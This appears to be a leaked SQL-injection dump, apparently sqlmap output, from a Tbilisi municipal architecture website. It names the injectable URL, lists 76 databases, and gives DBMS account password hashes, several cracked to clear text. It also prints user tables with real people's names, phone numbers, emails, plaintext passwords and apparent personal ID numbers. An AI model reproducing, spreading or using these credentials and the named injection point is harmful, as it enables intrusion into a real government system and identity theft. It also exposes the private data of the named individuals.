@@ -1,0 +1,196 @@
+.gov Government
+
+.ge Georgia
+
+Tbilisi Municipality City Hall
+
+Tbilisi Architect
+
+https://architect.tbilisi.gov.ge/psite/proj_all.php?id_cat=1
+
+back-end DBMS: MySQL >= 5.0.12
+
+available databases [76]:
+[*] agno
+[*] allmovies
+[*] android
+[*] architect
+[*] architect_chat
+[*] architect_old
+[*] artem
+[*] articleManager
+[*] axaliquchebi
+[*] budget
+[*] chat
+[*] cms
+[*] cnpcan
+[*] concources
+[*] cstbilis_new
+[*] dingyetest
+[*] eco
+[*] eco_architect
+[*] fom2011
+[*] freedom2011
+[*] gamgeobebi
+[*] hermes_archive_trash
+[*] information_schema
+[*] kids_test
+[*] kidslaravel
+[*] kidsorgge
+[*] live_chat
+[*] maps
+[*] mayor
+[*] meladzege
+[*] meri
+[*] meria_persons
+[*] mimdinare_architect
+[*] mshvildosnoba
+[*] mysql
+[*] new_site
+[*] newportal
+[*] newyear2010geo
+[*] ngo
+[*] olimpiada
+[*] phoenix
+[*] poll
+[*] portal
+[*] portali
+[*] projects
+[*] qoneba
+[*] questions
+[*] registration
+[*] resume
+[*] seragency
+[*] staff
+[*] streets
+[*] tbilisi
+[*] tbilisi_ge
+[*] tbilisi_portal_2015
+[*] tbilisigovge
+[*] tbilisigovge_test
+[*] tbilisii_inter
+[*] tbilisoba2010eng
+[*] tbilisoba2010geo
+[*] tbilisoba2010rus
+[*] teachge_base
+[*] teachge_userprogram
+[*] testings
+[*] testproject
+[*] transplantation_cms
+[*] tttt
+[*] urbana_iko
+[*] urbana_iko_eng
+[*] urbana_iko_new_competition
+[*] urbana_iko_rus
+[*] video_site
+[*] water_architect
+[*] webcam
+[*] webpage
+[*] works
+
+database management system users password hashes:                                                                                                                    
+[+] gamgeoba [1]:
+    password hash: 05859a8120a7f326
+[+] gapi [1]:
+    password hash: 153ca15c31cbb3b9
+[+] kursebi [1]:
+    password hash: 1d7a57990d77c50a
+[+] meri [1]:
+    password hash: 1f49e0140f2697f9
+[+] picker [1]:
+    password hash: 1f858a43200b589f
+    clear-text password: urbana
+[+] root [1]:
+    password hash: 05859a8120a7f326
+[+] staffadmin [1]:
+    password hash: 59a35da827b599ff
+[+] tbilisi.gov.ge [1]:
+    password hash: 446a12100c856ce9
+    clear-text password: 1234
+[+] tbilisii_inter [1]:
+    password hash: 5937160e142056ce
+    clear-text password: international
+[+] tbilisijoomla [1]:
+    password hash: 3203430326b6a99e
+    
+Database: tbilisigovge
+Table: users
+[3 entries]
++-----------+----------------------------------+-----------+------------+----------+
+| mobile    | password                         | firstname | lastname   | username |
++-----------+----------------------------------+-----------+------------+----------+
+| 599066868 | 0b62c281d84fd157d2d662707a6c6e56 | Artem     | Yagutyan   | admin    |
+| <blank>   | 8f8cd3503337f26525b06863e68c5fd9 | <blank>   | <blank>    | moder    |
+| 595757674 | 07ddb8809560f298b4d1f7b1ae5ae3a3 | Lili      | Kvinikadze | guser    |
++-----------+----------------------------------+-----------+------------+----------+
+
+Database: architect
+Table: users
+[43 entries]
++-----------+------------------+-----------+---------------------------------+
+| phone1    | password         | phone2    | email                           |
++-----------+------------------+-----------+---------------------------------+
+| 0         | 7777             | 0         | admin                           |
+| 877157007 | avaliani         | 378105    | m.avaliani@tbilisi.gov.ge       |
+| 877150777 | ninidze          | 378189    | d.ninidze@tbilisi.gov.ge        |
+| 877171020 | talakhadze       | 378164    | g.talakhadze@tbilisi.gov.ge     |
+| 899353038 | gogichaishvili   | 221601    | hauseart@yahoo.com              |
+| 877155562 | tavadze          | 332295    | tavadzeguram@yahoo.com          |
+| 877170072 | avaliani         | 920409    | davaliani@oldtbilisi.gov.ge     |
+| 877715071 | chkhaidze        | 291208    | nikastvis@hotmail.com           |
+| 877757463 | didebulidze      | 227031    | marididebuli@yahoo.com          |
+| 895903366 | makhatadze       | 332293    | mmanuchar@hotmail.com           |
+| 899757733 | shavishvili      | 317194    | mshavishvili@yahoo.com          |
+| 899533307 | tsulukidze       | 998991    | giotsu@yahoo.de                 |
+| 877171062 | gogolashvili     | 956125    | g.gogolashvili@posta.ge         |
+| 0         | gersamia         | 989310    | geta@mail.ru                    |
+| 877171011 | gventsadze       | 378314    | n.gventsadze@tbilisi.gov.ge     |
+| 877151540 | bochoidze        | 378288    | a.bochoidze@tbilisi.gov.ge      |
+| 899504236 | abuladze         | 251904    | giaabuladze@gmail.com           |
+| 877429470 | makharoblishvili | 225246    | dm_creativestudio@yahoo.com     |
+| 899747456 | gegelia          | 337324    | g.gegelia@posta.ge              |
+| 877150555 | gvelebiani       | 650099    | mrikamari@rambler.ru            |
+| 877151510 | 123456           | 0         | a.bochoidze@gmail.ge            |
+| 895715898 | 654321           | 951710    | maridev11@rambler.ru            |
+| 898178320 | 29031987         | 0         | greguar999@inbox.ru             |
+| 895355343 | 777777           | 273052    | vasocomaia@yahoo.com            |
+| 899197345 | megobari         | 751540    | mnndl@mail.ru                   |
+| 893631694 | 893631694        | 0         | ana-kotetishvili@mail.ru        |
+| 822691442 | x1a9t9i1a        | 0         | iraarveladze@yandex.ru          |
+| 855696875 | 575574           | 0         | temo_kv@mail.ru                 |
+| 871711612 | datuashvili      | 822251612 | g.datuashvili1988@gmail.com     |
+| 858504499 | 545652           | 0         | aleko-a-ch@mail.ru              |
+| 0         | kadima           | 228264    | keiko@ooo.ru                    |
+| 0         | kadika           | 228264    | natalibeqauri@mail.ru           |
+| 855261919 | niniko           | 0         | natalibeqauri@list.ru           |
+| 0         | globusi5         | 0         | tamunabulia@gmail.com           |
+| 899706377 | sololaki         | 0         | cira_elisashvili@yahoo.com      |
+| 0         | datucha          | 0         | vazha@ymail.com                 |
+| 574303271 | 5555             | 2722757   | eleneabzhandadze@mail.ru        |
+| 599544979 | 123qwe           | 0         | dito-tamo@inbox.ru              |
+| 558123812 | 1237852123       | 0         | giorgi.naskhidashvili@gmail.com |
+| 599284888 | 284888           | 0         | uka-71@mail.ru                  |
+| 597682052 | TIT_QMIS         | 0         | zviadi.gudushauri@mail.ru       |
+| 0         | krolika13        | 0         | iraklikil@yahoo.com             |
+| 2580072   | Nu79Kri79        | 0         | natiagargulia@gmail.com         |
++-----------+------------------+-----------+---------------------------------+
+
+Database: architect
+Table: quest_users
+[12 entries]
++-----------+------------+-------------+-----------------------------+
+| tel       | password   | user_name   | email                       |
++-----------+------------+-------------+-----------------------------+
+| 899238383 | kniusha    | 01008020599 | for_veronika@live.com       |
+| 877171069 | giorgi     | 08001010651 | qitesashvili@yahoo.com      |
+| 877171032 | natia1206  | 01001003364 | natia_bul@yahoo.com         |
+| 877171085 | myinvara   | 01019009120 | datosvani@gmail.com         |
+| 877171044 | abramovich | 01006012438 | d.abramidze@tbilisi.gov.ge  |
+| 877171020 | talakhadze | 38001006391 | g.talakhadze@tbilisi.gov.ge |
+| 877171071 | tatusia    | 62001014950 | t.ugulava@mail.ru           |
+| 877171002 | 123        | 01020013437 | etozangaladze@mail.ru       |
+| 877171051 | maia       | 56001000476 | datosvanii@gmail.com        |
+| 877171098 | koka       | 01011039646 | datosvani@gmail.com         |
+| 877171064 | tamuna     | 01008011633 | datosvani@gmail.com         |
+| 877171058 | 010299     | 01024022244 | ekakvirkvelia@mail.ri       |
++-----------+------------+-------------+-----------------------------+
